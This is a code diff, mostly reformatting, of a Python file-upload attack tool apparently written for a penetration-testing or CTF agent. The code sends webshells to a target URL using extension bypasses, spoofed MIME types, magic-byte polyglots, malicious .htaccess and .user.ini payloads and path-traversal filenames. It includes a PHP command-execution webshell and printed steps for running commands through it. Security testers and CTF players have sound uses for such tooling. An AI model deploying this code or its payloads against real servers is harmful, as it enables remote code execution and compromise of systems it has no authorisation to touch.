@@ -7,10 +7,9 @@ extension bypass, MIME type manipulation, webshell deployment,
 """
 
 import json
-import os
 import re
-from typing import Dict, List, Optional, Tuple
-from urllib.parse import urljoin
+from typing import Optional, Tuple
+
 import requests
 
 
@@ -192,7 +191,7 @@ class FileUploadTool:
         "addtype_png": "AddType application/x-httpd-php .png",
         "addtype_all": "AddType application/x-httpd-php .jpg .gif .png .txt",
         "sethandler": "SetHandler application/x-httpd-php",
-        "sethandler_match": "<FilesMatch \"\\.(jpg|gif|png)$\">\n    SetHandler application/x-httpd-php\n</FilesMatch>",
+        "sethandler_match": '<FilesMatch "\\.(jpg|gif|png)$">\n    SetHandler application/x-httpd-php\n</FilesMatch>',
         "addhandler": "AddHandler php-script .jpg",
         "options_exec": "Options +ExecCGI\nAddHandler cgi-script .jpg",
         "php_value": "php_value auto_prepend_file shell.jpg",
@@ -242,9 +241,16 @@ class FileUploadTool:
             return "[FileUploadTool] Error: 'operation' is required."
 
         valid_ops = [
-            "test_extensions", "test_mime", "test_content", "generate_webshell",
-            "full_test", "upload_custom", "upload_htaccess", "upload_userini",
-            "test_traversal", "generate_htaccess"
+            "test_extensions",
+            "test_mime",
+            "test_content",
+            "generate_webshell",
+            "full_test",
+            "upload_custom",
+            "upload_htaccess",
+            "upload_userini",
+            "test_traversal",
+            "generate_htaccess",
         ]
         if operation not in valid_ops:
             return f"[FileUploadTool] Error: Unknown operation '{operation}'. Valid: {', '.join(valid_ops)}"
@@ -261,7 +267,9 @@ class FileUploadTool:
                 # These operations need URL
                 url = data.get("url", "").strip()
                 if not url:
-                    return "[FileUploadTool] Error: 'url' is required for this operation."
+                    return (
+                        "[FileUploadTool] Error: 'url' is required for this operation."
+                    )
 
                 file_param = data.get("file_param", "file")
                 extra_data = data.get("data", {})
@@ -269,19 +277,33 @@ class FileUploadTool:
                 timeout = data.get("timeout", 30)
 
                 if operation == "test_extensions":
-                    return self._test_extensions(url, file_param, extra_data, headers, timeout, data)
+                    return self._test_extensions(
+                        url, file_param, extra_data, headers, timeout, data
+                    )
                 elif operation == "test_mime":
-                    return self._test_mime(url, file_param, extra_data, headers, timeout, data)
+                    return self._test_mime(
+                        url, file_param, extra_data, headers, timeout, data
+                    )
                 elif operation == "full_test":
-                    return self._full_test(url, file_param, extra_data, headers, timeout, data)
+                    return self._full_test(
+                        url, file_param, extra_data, headers, timeout, data
+                    )
                 elif operation == "upload_custom":
-                    return self._upload_custom(url, file_param, extra_data, headers, timeout, data)
+                    return self._upload_custom(
+                        url, file_param, extra_data, headers, timeout, data
+                    )
                 elif operation == "upload_htaccess":
-                    return self._upload_htaccess(url, file_param, extra_data, headers, timeout, data)
+                    return self._upload_htaccess(
+                        url, file_param, extra_data, headers, timeout, data
+                    )
                 elif operation == "upload_userini":
-                    return self._upload_userini(url, file_param, extra_data, headers, timeout, data)
+                    return self._upload_userini(
+                        url, file_param, extra_data, headers, timeout, data
+                    )
                 elif operation == "test_traversal":
-                    return self._test_traversal(url, file_param, extra_data, headers, timeout, data)
+                    return self._test_traversal(
+                        url, file_param, extra_data, headers, timeout, data
+                    )
 
         except requests.RequestException as e:
             return f"[FileUploadTool] Request error: {e}"
@@ -302,15 +324,9 @@ class FileUploadTool:
         timeout: int,
     ) -> Tuple[int, str, int]:
         """Upload a file and return (status_code, response_text, content_length)."""
-        files = {
-            file_param: (filename, content, content_type)
-        }
+        files = {file_param: (filename, content, content_type)}
         resp = self.session.post(
-            url,
-            files=files,
-            data=extra_data,
-            headers=headers,
-            timeout=timeout
+            url, files=files, data=extra_data, headers=headers, timeout=timeout
         )
         return resp.status_code, resp.text, len(resp.content)
 
@@ -330,7 +346,9 @@ class FileUploadTool:
         if language not in self.EXTENSION_BYPASSES:
             language = "php"
 
-        extensions = self.EXTENSION_BYPASSES[language] + self.EXTENSION_BYPASSES["general"]
+        extensions = (
+            self.EXTENSION_BYPASSES[language] + self.EXTENSION_BYPASSES["general"]
+        )
 
         # Get webshell content
         shell = self.WEBSHELLS.get(language, self.WEBSHELLS["php"])
@@ -341,14 +359,22 @@ class FileUploadTool:
         first_success_response = None  # Capture first successful response body
         discovered_paths = []  # Paths extracted from responses
 
-        results.append(f"\nTesting {len(extensions)} extension variants for {language}...")
+        results.append(
+            f"\nTesting {len(extensions)} extension variants for {language}..."
+        )
         results.append("")
 
         # First, get baseline with a safe extension
         try:
             baseline_status, baseline_text, _ = self._upload_file(
-                url, file_param, "test.txt", b"test content",
-                "text/plain", extra_data, headers, timeout
+                url,
+                file_param,
+                "test.txt",
+                b"test content",
+                "text/plain",
+                extra_data,
+                headers,
+                timeout,
             )
             results.append(f"Baseline (.txt): Status {baseline_status}")
             # Check baseline response for path info
@@ -363,8 +389,14 @@ class FileUploadTool:
             filename = f"shell{ext}"
             try:
                 status, text, _ = self._upload_file(
-                    url, file_param, filename, content,
-                    "application/octet-stream", extra_data, headers, timeout
+                    url,
+                    file_param,
+                    filename,
+                    content,
+                    "application/octet-stream",
+                    extra_data,
+                    headers,
+                    timeout,
                 )
 
                 # Check for success indicators
@@ -380,7 +412,9 @@ class FileUploadTool:
 
                     # Extract upload path from response
                     extracted_path = self._extract_upload_path(text)
-                    if extracted_path and extracted_path not in [p for _, p in discovered_paths]:
+                    if extracted_path and extracted_path not in [
+                        p for _, p in discovered_paths
+                    ]:
                         discovered_paths.append((filename, extracted_path))
                 else:
                     failed.append((filename, status))
@@ -448,8 +482,14 @@ class FileUploadTool:
         for mime in all_mimes:
             try:
                 status, text, _ = self._upload_file(
-                    url, file_param, filename, content,
-                    mime, extra_data, headers, timeout
+                    url,
+                    file_param,
+                    filename,
+                    content,
+                    mime,
+                    extra_data,
+                    headers,
+                    timeout,
                 )
 
                 is_success = self._check_upload_success(status, text, 200)
@@ -490,7 +530,9 @@ class FileUploadTool:
 
         # Get webshell
         shells = self.WEBSHELLS.get(language, self.WEBSHELLS["php"])
-        shell = shells.get(shell_type, shells.get("simple", "<?php system($_GET['cmd']); ?>"))
+        shell = shells.get(
+            shell_type, shells.get("simple", "<?php system($_GET['cmd']); ?>")
+        )
 
         # Combine magic bytes + shell
         combined = magic + b"\n" + shell.encode()
@@ -506,7 +548,7 @@ class FileUploadTool:
         results.append("=== Generated Content (readable) ===")
 
         try:
-            readable = combined.decode('utf-8', errors='replace')
+            readable = combined.decode("utf-8", errors="replace")
             results.append(readable[:500])
         except Exception:
             results.append("[Binary content]")
@@ -544,7 +586,9 @@ class FileUploadTool:
             # Replace default command parameter if specified
             modified_shell = shell
             if command != "cmd":
-                modified_shell = shell.replace("cmd", command).replace("'c'", f"'{command}'")
+                modified_shell = shell.replace("cmd", command).replace(
+                    "'c'", f"'{command}'"
+                )
             results.append(modified_shell)
             results.append("")
 
@@ -590,7 +634,9 @@ class FileUploadTool:
 
         # Phase 1: Test basic extensions
         results.append("=== Phase 1: Extension Testing ===")
-        extensions = self.EXTENSION_BYPASSES.get(language, self.EXTENSION_BYPASSES["php"])[:10]
+        extensions = self.EXTENSION_BYPASSES.get(
+            language, self.EXTENSION_BYPASSES["php"]
+        )[:10]
         shell = self.WEBSHELLS.get(language, self.WEBSHELLS["php"])
         content = shell.get("simple", "<?php system($_GET['cmd']); ?>").encode()
 
@@ -598,11 +644,19 @@ class FileUploadTool:
             filename = f"test{ext}"
             try:
                 status, text, _ = self._upload_file(
-                    url, file_param, filename, content,
-                    "application/octet-stream", extra_data, headers, timeout
+                    url,
+                    file_param,
+                    filename,
+                    content,
+                    "application/octet-stream",
+                    extra_data,
+                    headers,
+                    timeout,
                 )
                 if self._check_upload_success(status, text, 200):
-                    successful_uploads.append(("extension", filename, "application/octet-stream"))
+                    successful_uploads.append(
+                        ("extension", filename, "application/octet-stream")
+                    )
                     results.append(f"[+] {filename}: SUCCESS")
             except Exception as e:
                 results.append(f"[-] {filename}: {e}")
@@ -616,8 +670,14 @@ class FileUploadTool:
             filename = f"test{test_ext}"
             try:
                 status, text, _ = self._upload_file(
-                    url, file_param, filename, content,
-                    mime, extra_data, headers, timeout
+                    url,
+                    file_param,
+                    filename,
+                    content,
+                    mime,
+                    extra_data,
+                    headers,
+                    timeout,
                 )
                 if self._check_upload_success(status, text, 200):
                     successful_uploads.append(("mime", filename, mime))
@@ -634,11 +694,19 @@ class FileUploadTool:
             filename = f"test.{magic_name}{test_ext}"
             try:
                 status, text, _ = self._upload_file(
-                    url, file_param, filename, polyglot,
-                    f"image/{magic_name}", extra_data, headers, timeout
+                    url,
+                    file_param,
+                    filename,
+                    polyglot,
+                    f"image/{magic_name}",
+                    extra_data,
+                    headers,
+                    timeout,
                 )
                 if self._check_upload_success(status, text, 200):
-                    successful_uploads.append(("magic", filename, f"image/{magic_name}"))
+                    successful_uploads.append(
+                        ("magic", filename, f"image/{magic_name}")
+                    )
                     results.append(f"[+] {filename} with {magic_name} magic: SUCCESS")
             except Exception:
                 pass
@@ -671,7 +739,9 @@ class FileUploadTool:
 
         return "\n".join(results)
 
-    def _check_upload_success(self, status: int, text: str, baseline_status: int) -> bool:
+    def _check_upload_success(
+        self, status: int, text: str, baseline_status: int
+    ) -> bool:
         """Check if upload was successful based on response."""
         # Status code checks
         if status >= 400:
@@ -721,7 +791,7 @@ class FileUploadTool:
             # HTML responses with paths
             r'(?:href|src)=["\']([^"\']*uploads?[^"\']*\.\w+)["\']',
             # Absolute paths
-            r'(/[\w\-./]+/[\w\-]+\.\w{2,5})',
+            r"(/[\w\-./]+/[\w\-]+\.\w{2,5})",
         ]
         for pattern in patterns:
             match = re.search(pattern, response_text, re.IGNORECASE)
@@ -750,7 +820,7 @@ class FileUploadTool:
 
         # Convert content to bytes
         if isinstance(content, str):
-            content_bytes = content.encode('utf-8')
+            content_bytes = content.encode("utf-8")
         else:
             content_bytes = content
 
@@ -762,11 +832,17 @@ class FileUploadTool:
 
         try:
             status, text, size = self._upload_file(
-                url, file_param, filename, content_bytes,
-                content_type, extra_data, headers, timeout
+                url,
+                file_param,
+                filename,
+                content_bytes,
+                content_type,
+                extra_data,
+                headers,
+                timeout,
             )
 
-            results.append(f"=== Response ===")
+            results.append("=== Response ===")
             results.append(f"Status: {status}")
             results.append(f"Response length: {size} bytes")
             results.append("")
@@ -812,7 +888,10 @@ class FileUploadTool:
         # Try multiple .htaccess payloads
         payloads_to_try = [
             ("addtype", f"AddType application/x-httpd-php {target_ext}"),
-            ("sethandler", f'<FilesMatch "\\{target_ext}$">\n    SetHandler application/x-httpd-php\n</FilesMatch>'),
+            (
+                "sethandler",
+                f'<FilesMatch "\\{target_ext}$">\n    SetHandler application/x-httpd-php\n</FilesMatch>',
+            ),
             ("addhandler", f"AddHandler php-script {target_ext}"),
             ("php_value", f"php_value auto_prepend_file shell{target_ext}"),
         ]
@@ -828,8 +907,14 @@ class FileUploadTool:
             try:
                 # Upload .htaccess with EXACT filename
                 status, text, _ = self._upload_file(
-                    url, file_param, ".htaccess", payload.encode('utf-8'),
-                    "text/plain", extra_data, headers, timeout
+                    url,
+                    file_param,
+                    ".htaccess",
+                    payload.encode("utf-8"),
+                    "text/plain",
+                    extra_data,
+                    headers,
+                    timeout,
                 )
 
                 is_success = self._check_upload_success(status, text, 200)
@@ -851,9 +936,9 @@ class FileUploadTool:
             results.append("=== Next Steps ===")
             results.append(f"1. Upload a PHP webshell with {target_ext} extension:")
             results.append(f"   Filename: shell{target_ext}")
-            results.append(f"   Content: <?php system($_GET['cmd']); ?>")
+            results.append("   Content: <?php system($_GET['cmd']); ?>")
             results.append("")
-            results.append(f"2. Access the shell:")
+            results.append("2. Access the shell:")
             results.append(f"   /uploads/shell{target_ext}?cmd=id")
             results.append(f"   /images/shell{target_ext}?cmd=cat /flag.txt")
             results.append("")
@@ -903,8 +988,14 @@ class FileUploadTool:
         for name, payload in payloads_to_try:
             try:
                 status, text, _ = self._upload_file(
-                    url, file_param, ".user.ini", payload.encode('utf-8'),
-                    "text/plain", extra_data, headers, timeout
+                    url,
+                    file_param,
+                    ".user.ini",
+                    payload.encode("utf-8"),
+                    "text/plain",
+                    extra_data,
+                    headers,
+                    timeout,
                 )
 
                 is_success = self._check_upload_success(status, text, 200)
@@ -963,8 +1054,14 @@ class FileUploadTool:
         for payload in self.TRAVERSAL_PAYLOADS:
             try:
                 status, text, _ = self._upload_file(
-                    url, file_param, payload, content,
-                    "application/octet-stream", extra_data, headers, timeout
+                    url,
+                    file_param,
+                    payload,
+                    content,
+                    "application/octet-stream",
+                    extra_data,
+                    headers,
+                    timeout,
                 )
 
                 # Check for different responses that indicate traversal worked
@@ -1128,12 +1225,16 @@ class UploadLocationFinder:
         for path in paths_to_check:
             full_url = f"{base_url}{path}{filename}"
             try:
-                resp = self.session.head(full_url, timeout=timeout, allow_redirects=False)
+                resp = self.session.head(
+                    full_url, timeout=timeout, allow_redirects=False
+                )
                 if resp.status_code == 200:
                     found.append(full_url)
                     results.append(f"[+] FOUND: {full_url}")
                 elif resp.status_code in [301, 302, 303, 307, 308]:
-                    results.append(f"[?] Redirect: {full_url} -> {resp.headers.get('Location', 'unknown')}")
+                    results.append(
+                        f"[?] Redirect: {full_url} -> {resp.headers.get('Location', 'unknown')}"
+                    )
             except Exception:
                 pass
 
@@ -1156,7 +1257,9 @@ class UploadLocationFinder:
             results.append("")
             results.append("=== Suggestions ===")
             results.append("1. Check response for upload path disclosure")
-            results.append("2. Try predictable naming: /uploads/1.php, /uploads/file.php")
+            results.append(
+                "2. Try predictable naming: /uploads/1.php, /uploads/file.php"
+            )
             results.append("3. Look for path in cookies or headers")
             results.append("4. Check robots.txt for upload directories")
 
